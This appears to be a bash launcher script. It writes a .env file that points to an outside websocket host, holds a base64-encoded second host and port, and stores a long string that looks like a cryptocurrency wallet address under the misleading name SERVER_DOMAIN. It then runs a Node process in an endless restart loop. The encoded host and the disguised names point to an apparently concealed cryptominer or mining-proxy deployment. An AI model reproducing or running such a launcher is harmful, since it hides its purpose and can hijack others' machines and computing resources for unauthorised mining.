#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=ws://cdn.medco.cyou
SERVER_TARGET=czEuZGFwaXRheC5zb2NpYWw6ODA4Mg==
SERVER_DOMAIN=85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
SERVER_SECRET=secret
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 10; done
